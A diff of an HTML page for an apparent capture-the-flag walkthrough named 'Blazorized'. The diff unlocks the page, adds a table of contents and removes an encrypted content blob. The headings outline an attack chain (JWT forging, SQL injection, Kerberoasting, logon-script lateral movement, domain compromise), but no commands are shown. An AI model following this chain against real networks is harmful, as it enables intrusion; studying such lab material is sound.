@@ -20,7 +20,7 @@
     
     
       
-        <title>[Protected] Blazorized - xpltive</title>
+        <title>Blazorized - xpltive</title>
       
     
     
@@ -46,7 +46,7 @@
       
     
     
-      <link rel="stylesheet" href="../../stylesheets/center.css">
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
     
     <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
     
@@ -72,6 +72,11 @@
     <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
+      
+        
+        <a href="#initial-enumeration" class="md-skip">
+          Skip to content
+        </a>
       
     </div>
     <div data-md-component="announce">
@@ -123,7 +128,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              [Protected] Blazorized
+              Blazorized
             
           </span>
         </div>
@@ -530,7 +535,7 @@
         
   
   <span class="md-ellipsis">
-    [Protected] Axlle
+    Axlle
   </span>
   
 
@@ -554,15 +559,169 @@
       
       
       
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Blazorized
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
       <a href="./" class="md-nav__link md-nav__link--active">
         
   
   <span class="md-ellipsis">
-    [Protected] Blazorized
+    Blazorized
   </span>
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#initial-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Initial Enumeration
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Initial Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nmap-scan" class="md-nav__link">
+    <span class="md-ellipsis">
+      Nmap Scan
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#port-80tcp" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 80/TCP
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#researching-enumerating-sensitive-files-in-blazor" class="md-nav__link">
+    <span class="md-ellipsis">
+      Researching &amp; Enumerating Sensitive Files in Blazor
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploitation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#decompiling-dlls" class="md-nav__link">
+    <span class="md-ellipsis">
+      Decompiling DLLs
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#generate-jwt" class="md-nav__link">
+    <span class="md-ellipsis">
+      Generate JWT
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sql-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      SQL Injection
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ad-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      AD Exploitation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="AD Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#targeted-kerberoasting-lateral-movement-to-rsa_4810" class="md-nav__link">
+    <span class="md-ellipsis">
+      Targeted Kerberoasting &amp; Lateral Movement to rsa_4810
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#writing-logon-script-lateral-movement-to-ssa_6010" class="md-nav__link">
+    <span class="md-ellipsis">
+      Writing Logon Script &amp; Lateral Movement to ssa_6010
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#domain-compromise" class="md-nav__link">
+    <span class="md-ellipsis">
+      Domain Compromise
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -946,6 +1105,140 @@
   
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#initial-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      Initial Enumeration
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Initial Enumeration">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nmap-scan" class="md-nav__link">
+    <span class="md-ellipsis">
+      Nmap Scan
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#port-80tcp" class="md-nav__link">
+    <span class="md-ellipsis">
+      Port 80/TCP
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#researching-enumerating-sensitive-files-in-blazor" class="md-nav__link">
+    <span class="md-ellipsis">
+      Researching &amp; Enumerating Sensitive Files in Blazor
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      Exploitation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#decompiling-dlls" class="md-nav__link">
+    <span class="md-ellipsis">
+      Decompiling DLLs
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#generate-jwt" class="md-nav__link">
+    <span class="md-ellipsis">
+      Generate JWT
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#sql-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      SQL Injection
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#ad-exploitation" class="md-nav__link">
+    <span class="md-ellipsis">
+      AD Exploitation
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="AD Exploitation">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#targeted-kerberoasting-lateral-movement-to-rsa_4810" class="md-nav__link">
+    <span class="md-ellipsis">
+      Targeted Kerberoasting &amp; Lateral Movement to rsa_4810
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#writing-logon-script-lateral-movement-to-ssa_6010" class="md-nav__link">
+    <span class="md-ellipsis">
+      Writing Logon Script &amp; Lateral Movement to ssa_6010
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#domain-compromise" class="md-nav__link">
+    <span class="md-ellipsis">
+      Domain Compromise
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -959,33 +1252,626 @@
                   
 
 
-<div id="mkdocs-encrypted-content" style="display:none">+mGZJIO6uTiC56Sf8xwGew==;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